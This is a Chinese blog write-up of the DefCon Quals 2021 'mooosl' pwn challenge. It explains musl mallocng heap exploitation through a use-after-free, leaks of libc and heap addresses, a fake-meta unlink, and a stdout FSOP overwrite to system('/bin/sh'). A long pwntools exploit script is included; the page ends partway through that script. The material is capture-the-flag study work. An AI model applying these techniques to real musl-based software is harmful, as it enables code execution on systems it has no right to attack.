@@ -1,0 +1,331 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇） | Sung3r&#39;s Blog</title>
+  <meta name="author" content="sung3r">
+  
+  <meta name="description" content="DefCon Quals 2021 mooosl的解题思路">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）"/>
+  <meta property="og:site_name" content="Sung3r&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Sung3r&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> DefCon Quals 2021 mooosl的解题思路
+		 </div> <!-- alert -->
+	  		
+
+	  <p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/241104" target="_blank" rel="noopener">借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）</a></p>
+<p>上篇我们大致过了一遍musl libc 1.2.2的mallocng源码，了解到musl堆管理器用以下的结构管理着meta、group以及chunk。本篇我们继续来分析mooosl这道题的解题思路。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620877156490-1620877156490.png" alt="title"></p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>保护全开<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961337503-1620961337534.png" alt="title"></p>
+<p>程序主要提供了<code>store</code>、<code>query</code>、<code>delete</code>这几个功能，下面逐个功能进行分析<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961459130-1620961459131.png" alt="title"></p>
+<p>sotre，申请0x30的chunk，用于存放key、value以及对应的size，另外还会算出hash和prev_hash_map（保存着hash_map先前在该处的指针）<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973183066-1620973183067.png" alt="title"></p>
+<p>set_key和set_value，比较类似，根据输入的size去申请chunk，然后填入key和value，所以store方法一共会申请3个chunk<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620962248015-1620962248017.png" alt="title"></p>
+<p>get_hash，返回一个hash值，返回后只取低12位，根据这个hash得到hash_map[hash&amp;0xfff]，先将hash_map[hash&amp;0xfff]原有的值保存在prev_hash_map，然后将0x30 chunk的地址存入hash_map[hash&amp;0xfff]<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973758763-1620973758765.png" alt="title"></p>
+<p>query，查询功能，根据输入的key，找到对应的value并以hex字符串形式输出。注意到这里调了set_key，会先申请chunk用于存放key，最后再free掉。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973813101-1620973813103.png" alt="title"></p>
+<p>查找过程是遍历hash_map找到对应key，如果prev_hash_map不为零，则会打印出prev_hash_map的数据<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979440795-1620979440796.png" alt="title"></p>
+<p>delete，删除功能，如果从hash_map中找到对应的key，则会从free掉对应的3个chunk，最后再free掉调set_key时产生的chunk。另外，如果prev_hash_map不为0，则会将hash_map[hash&amp;0xfff]置为prev_hash_map后再free掉prev_hash_map所指向的chunk。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973954962-1620973954963.png" alt="title"></p>
+<p>很明显，如果hash_map[hash&amp;0xfff]的原有的值为0，则delete后会将hash_map[hash&amp;0xfff]清0，可通过连续store两次相同hash去绕过。而且，在上一篇文章中我们了解到musl libc在free掉一个chunk时不会将user data域清零。所以，当绕过了<code>*v2 = (struct_v1 *)ptr-&gt;prev_hash_map</code>之后，就相当于有了一个uaf漏洞。</p>
+<h1 id="Leak-libc"><a href="#Leak-libc" class="headerlink" title="Leak libc"></a>Leak libc</h1><p>知道了musl堆的重分配机制，泄露内存地址的思路就比较清晰了</p>
+<p>group对chunk的管理策略：<br>1.chunk按照内存先后，依次分配；<br>2.free掉的chunk不能马上分配；<br>3.需要等group内所有chunk都处于freed或者used状态时，才会将freed状态的chunk转换成avaliable；<br>4.分配chunk时，会将user data域用\x00初始化。</p>
+<p>采取的堆风水策略<br>1.先store一次垫着group header防止free掉group所有chunk时，将整个group内存归还给堆管理器；<br>2.除最后一个与第一个chunk，其余全部free掉；<br>3.申请一个<code>\n</code> struct chunk（这个chunk存放着key value指针），这时候key chunk和value chunk便会落在struct chunk的内存之前，value chunk与struct chunk相同size；<br>4.free掉struct chunk，然后再free掉group内除第一个的所有chunk，再申请一个struct chunk（key value chunk size不为0x30）<br>5.这时，这个struct chunk便落在<code>\n</code> struct chunk的value chunk域内，通过query(‘\n’)便可打印出内存信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">###Info Leak</span><br><span class="line">store(&#39;A&#39;, &#39;A&#39;)#AAAAAAU</span><br><span class="line"></span><br><span class="line">#clear for reusing freed chunks</span><br><span class="line">for _ in range(5):</span><br><span class="line">    query(&#39;A&#39; * 0x30)#AFFFFFU</span><br><span class="line"></span><br><span class="line">store(&#39;\n&#39;, &#39;A&#39; * 0x30)#UAAAAAU -&gt; UAAAA[U]U #0x4040+0x7e5*8 &#x3D; 0x7f68   []就是要控的chunk</span><br><span class="line">store(find_key(), &#39;A&#39;)#UAAAU[U]U</span><br><span class="line">delete(&#39;\n&#39;)#FAAAU[F]U</span><br><span class="line"></span><br><span class="line">#clear for reusing freed chunks</span><br><span class="line">for _ in range(3):</span><br><span class="line">    query(&#39;A&#39; * 0x30)#FFFFU[F]U</span><br><span class="line"></span><br><span class="line">store(&#39;A\n&#39;, &#39;A&#39;, 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr</span><br><span class="line">query(&#39;\n&#39;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979641496-1620979641530.png" alt="title"></p>
+<p>继续利用该策略将libc基地址等内存信息leak出来<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620980002926-1620980002928.png" alt="title"></p>
+<h1 id="从musl-unlink到FSOP"><a href="#从musl-unlink到FSOP" class="headerlink" title="从musl unlink到FSOP"></a>从musl unlink到FSOP</h1><p>利用meta dequeue方法的unlink漏洞可以达到任意写的效果<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621050713394-1621050713399.png" alt="title"></p>
+<p>注意到nontrivial_free方法，当g-&gt;freed_mask | g-&gt;avail_mask为0时，也就是当所有块都在使用中，这时可以引入next meta和group进行块处理。也就是可以引用fake meta，并通过其返回任意地址。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621051185743-1621051185745.png" alt="title"></p>
+<p>构造一个fake meta，数据结构需要符合get_meta方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Overwrite stdout-0x10 to fake_meta_addr using dequeue during free</span><br><span class="line">sc &#x3D; 8 # 0x90</span><br><span class="line">freeable &#x3D; 1</span><br><span class="line">last_idx &#x3D; 0</span><br><span class="line">maplen &#x3D; 1</span><br><span class="line">fake_meta &#x3D; b&#39;&#39;</span><br><span class="line">fake_meta +&#x3D; p64(stdout - 0x18) # prev</span><br><span class="line">fake_meta +&#x3D; p64(fake_meta_addr + 0x30) # next</span><br><span class="line">fake_meta +&#x3D; p64(fake_mem_addr) # mem</span><br><span class="line">fake_meta +&#x3D; p32(0) + p32(0) # avail_mask, freed_mask</span><br><span class="line">fake_meta +&#x3D; p64((maplen &lt;&lt; 12) | (sc &lt;&lt; 6) | (freeable &lt;&lt; 5) | last_idx)</span><br><span class="line">fake_meta +&#x3D; p64(0)</span><br><span class="line"></span><br><span class="line">fake_mem &#x3D; b&#39;&#39;</span><br><span class="line">fake_mem +&#x3D; p64(fake_meta_addr) # meta</span><br><span class="line">fake_mem +&#x3D; p32(1) # active_idx</span><br><span class="line">fake_mem +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">payload &#x3D; b&#39;&#39;</span><br><span class="line">payload +&#x3D; b&#39;A&#39; * 0xaa0</span><br><span class="line">payload +&#x3D; p64(secret) + p64(0)</span><br><span class="line">payload +&#x3D; fake_meta</span><br><span class="line">payload +&#x3D; fake_mem</span><br><span class="line">payload +&#x3D; b&#39;\n&#39;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>如上，将fake mem放置在fake meta相邻位置，提前布置好avail_mask、freed_mask、last_idx等结构。另外，还需要页对齐，并且页首8个byte需要布置一个page secret数据，绕过meta的check。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621053927181-1621053927186.png" alt="title"></p>
+<p>unlink，在<code>&amp;(stdout-0x18)-&gt;prev = &amp;(stdout-0x10)</code>处写入fake_mem的地址<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621054556237-1621054556263.png" alt="title"></p>
+<p>通过queue方法令fake meta进入ctx.active列表<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621055201102-1621055201104.png" alt="title"></p>
+<p><code>sc=0x8</code>的group已经由fake meta进行管理<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621055242313-1621055242315.png" alt="title"></p>
+<p>现在可以随意修改fake_meta的fake_mem，令其指向<code>stdout-0x10</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621055592454-1621055592456.png" alt="title"></p>
+<p>申请size 0x80的chunk，便会将<code>stdout-0x10</code>分配回来。然后覆盖stdout-&gt;write函数指针为system，在stdout-&gt;flags写入<code>/bin/sh\x00</code>，并且保证<code>stdin-&gt;wpos != stdin-&gt;wbase</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621056610228-1621056610232.png" alt="title"></p>
+<p>getshell~<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/15/1621056808132-1621056808133.png" alt="title"></p>
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>完整EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import codecs</span><br><span class="line"></span><br><span class="line">context.terminal &#x3D; [&#39;terminator&#39;, &#39;--new-tab&#39;, &#39;-x&#39;]</span><br><span class="line">#context.terminal &#x3D; [&#39;terminator&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">DEBUG &#x3D; 1</span><br><span class="line">TARGET &#x3D; &#39;.&#x2F;mooosl&#39;</span><br><span class="line">LIBCSO &#x3D; &#39;.&#x2F;libc.so&#39;</span><br><span class="line">#LIBCSO &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-musl&#x2F;libc.so&#39;</span><br><span class="line">#LIBCSO &#x3D; &#39;.&#x2F;libc.so&#39;</span><br><span class="line">#LIBCSO &#x3D; &#39;&#x2F;mnt&#x2F;hgfs&#x2F;sharefd&#x2F;envs&#x2F;musl&#x2F;1.2.2&#x2F;local.x64&#x2F;lib&#x2F;x86_64-linux-musl&#x2F;libc.so&#39;</span><br><span class="line">MODULE &#x3D; LIBCSO</span><br><span class="line">GLOBAL &#x3D; &#39;&#39;&#39;</span><br><span class="line">mcinit -a 1.2.2</span><br><span class="line">b dequeue</span><br><span class="line">b queue</span><br><span class="line">p __malloc_context</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">tube.s &#x3D; tube.send</span><br><span class="line">tube.sl &#x3D; tube.sendline</span><br><span class="line">tube.sa &#x3D; tube.sendafter</span><br><span class="line">tube.sla &#x3D; tube.sendlineafter</span><br><span class="line">tube.r &#x3D; tube.recv</span><br><span class="line">tube.ru &#x3D; tube.recvuntil</span><br><span class="line">tube.rl &#x3D; tube.recvline</span><br><span class="line">tube.ra &#x3D; tube.recvall</span><br><span class="line">tube.rr &#x3D; tube.recvregex</span><br><span class="line">tube.irt &#x3D; tube.interactive</span><br><span class="line"></span><br><span class="line">if DEBUG &#x3D;&#x3D; 0:</span><br><span class="line">    p &#x3D; process(TARGET)</span><br><span class="line">    text_base &#x3D; int(os.popen(&quot;pmap &#123;&#125; | grep &#123;&#125; | awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid, TARGET.split(&#39;&#x2F;&#39;)[-1])).readlines()[1], 16)</span><br><span class="line">    libs_base &#x3D; int(os.popen(&quot;pmap &#123;&#125; | grep &#123;&#125; | awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid, MODULE.split(&#39;&#x2F;&#39;)[-1])).readlines()[0],16)</span><br><span class="line">elif DEBUG &#x3D;&#x3D; 1:</span><br><span class="line">    p &#x3D; process(TARGET, env&#x3D;&#123;&#39;LD_PRELOAD&#39; : &#39;.&#x2F;libc.so.6&#39;&#125;)</span><br><span class="line">    text_base &#x3D; int(os.popen(&quot;pmap &#123;&#125; | grep &#123;&#125; | awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid, TARGET.split(&#39;&#x2F;&#39;)[-1])).readlines()[1], 16)</span><br><span class="line">    libs_base &#x3D; int(os.popen(&quot;pmap &#123;&#125; | grep &#123;&#125; | awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid, MODULE.split(&#39;&#x2F;&#39;)[-1])).readlines()[0],16)</span><br><span class="line">elif DEBUG &#x3D;&#x3D; 2:</span><br><span class="line">    p &#x3D; remote(&#39;mooosl.challengep.ooo&#39;, 23333)</span><br><span class="line">elif DEBUG &#x3D;&#x3D; 3:</span><br><span class="line">	r &#x3D; ssh(host&#x3D;host, user&#x3D;&#39;username&#39;, password&#x3D;&#39;passwd&#39;)</span><br><span class="line">	p &#x3D; r.shell()</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(TARGET)</span><br><span class="line">libc &#x3D; ELF(LIBCSO)</span><br><span class="line"></span><br><span class="line">def debug(addr &#x3D; 0):</span><br><span class="line">    if addr !&#x3D; 0:</span><br><span class="line">        gdb.attach(p, &#39;b *&#123;&#125;&#123;&#125;&#39;.format(hex(addr), GLOBAL))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p, &#39;&#123;&#125;&#39;.format(GLOBAL))</span><br><span class="line"></span><br><span class="line">def store(key_content, value_content, key_size&#x3D;None, value_size&#x3D;None, wait&#x3D;True):</span><br><span class="line">    p.sendlineafter(&#39;option: &#39;, &#39;1&#39;)</span><br><span class="line">    if key_size is None:</span><br><span class="line">        key_size &#x3D; len(key_content)</span><br><span class="line">    p.sendlineafter(&#39;size: &#39;, str(key_size))</span><br><span class="line">    p.sendafter(&#39;content: &#39;, key_content)</span><br><span class="line">    if value_size is None:</span><br><span class="line">        value_size &#x3D; len(value_content)</span><br><span class="line">    p.sendlineafter(&#39;size: &#39;, str(value_size))</span><br><span class="line">    if wait:</span><br><span class="line">        p.recvuntil(&#39;content: &#39;)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line">def query(key_content, key_size&#x3D;None, wait&#x3D;True):</span><br><span class="line">    p.sendlineafter(&#39;option: &#39;, &#39;2&#39;)</span><br><span class="line">    if key_size is None:</span><br><span class="line">        key_size &#x3D; len(key_content)</span><br><span class="line">    p.sendlineafter(&#39;size: &#39;, str(key_size))</span><br><span class="line">    if wait:</span><br><span class="line">        p.recvuntil(&#39;content: &#39;)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line">def delete(key_content, key_size&#x3D;None):</span><br><span class="line">    p.sendlineafter(&#39;option: &#39;, &#39;3&#39;)</span><br><span class="line">    if key_size is None:</span><br><span class="line">        key_size &#x3D; len(key_content)</span><br><span class="line">    p.sendlineafter(&#39;size: &#39;, str(key_size))</span><br><span class="line">    p.sendafter(&#39;content: &#39;, key_content)</span><br><span class="line"></span><br><span class="line">def get_hash(content):</span><br><span class="line">    x &#x3D; 0x7e5</span><br><span class="line">    for c in content:</span><br><span class="line">        x &#x3D; ord(c) + x * 0x13377331</span><br><span class="line">    return x &amp; 0xfff</span><br><span class="line"></span><br><span class="line">def find_key(length&#x3D;0x10, h&#x3D;0x7e5):</span><br><span class="line">    while True:</span><br><span class="line">        x &#x3D; &#39;&#39;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))</span><br><span class="line">        if get_hash(x) &#x3D;&#x3D; h:</span><br><span class="line">            return x</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    info(&quot;pwnit!&quot;)</span><br><span class="line">    ###Info Leak</span><br><span class="line">    store(&#39;A&#39;, &#39;A&#39;)#AAAAAAU</span><br><span class="line"></span><br><span class="line">    #clear for reusing freed chunks</span><br><span class="line">    for _ in range(5):</span><br><span class="line">        query(&#39;A&#39; * 0x30)#AFFFFFU</span><br><span class="line"></span><br><span class="line">    store(&#39;\n&#39;, &#39;A&#39; * 0x30)#UAAAAAU -&gt; UAAAA[U]U #0x4040+0x7e5*8 &#x3D; 0x7f68   []就是要控的chunk</span><br><span class="line">    store(find_key(), &#39;A&#39;)#UAAAU[U]U</span><br><span class="line">    delete(&#39;\n&#39;)#FAAAU[F]U</span><br><span class="line"></span><br><span class="line">    #clear for reusing freed chunks</span><br><span class="line">    for _ in range(3):</span><br><span class="line">        query(&#39;A&#39; * 0x30)#FFFFU[F]U</span><br><span class="line"></span><br><span class="line">    store(&#39;A\n&#39;, &#39;A&#39;, 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr</span><br><span class="line">    query(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">    res &#x3D; codecs.decode(p.rl(False).split(b&#39;:&#39;)[1], &#39;hex&#39;)</span><br><span class="line">    mmap_base &#x3D; u64(res[:8]) - 0x20</span><br><span class="line">    chunk_addr &#x3D; u64(res[8:0x10])</span><br><span class="line"></span><br><span class="line">    for _ in range(3):</span><br><span class="line">        query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(p64(0) + p64(chunk_addr - 0x60) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))</span><br><span class="line">    query(&#39;\n&#39;)</span><br><span class="line">    heap_base &#x3D; u64(codecs.decode(p.rl(False).split(b&#39;:&#39;)[1], &#39;hex&#39;)[:8]) - 0x1d0</span><br><span class="line">    </span><br><span class="line">    for _ in range(3):</span><br><span class="line">        query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(p64(0) + p64(heap_base + 0xf0) + p64(0) + p64(0x200) + p64(0x7e5) + p64(0))</span><br><span class="line">    query(&#39;\n&#39;)</span><br><span class="line">    libc.address &#x3D; u64(codecs.decode(p.rl(False).split(b&#39;:&#39;)[1], &#39;hex&#39;)[:8]) - 0xb7040</span><br><span class="line"></span><br><span class="line">    for _ in range(3):</span><br><span class="line">        query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(p64(0) + p64(next(libc.search(b&#39;&#x2F;bin&#x2F;sh\0&#39;))) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))</span><br><span class="line">    query(&#39;\n&#39;)</span><br><span class="line">    assert codecs.decode(p.rl(False).split(b&#39;:&#39;)[1], &#39;hex&#39;)[:8] &#x3D;&#x3D; b&#39;&#x2F;bin&#x2F;sh\0&#39;</span><br><span class="line"></span><br><span class="line">    for _ in range(3):</span><br><span class="line">        query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(p64(0) + p64(heap_base) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))</span><br><span class="line">    query(&#39;\n&#39;)</span><br><span class="line">    secret &#x3D; u64(codecs.decode(p.rl(False).split(b&#39;:&#39;)[1], &#39;hex&#39;)[:8])</span><br><span class="line"></span><br><span class="line">    log.info(&#39;mmap base: %#x&#39; % mmap_base)</span><br><span class="line">    log.info(&#39;chunk address: %#x&#39; % chunk_addr)</span><br><span class="line">    log.info(&#39;heap base: %#x&#39; % heap_base)</span><br><span class="line">    log.info(&#39;libc base: %#x&#39; % libc.address)</span><br><span 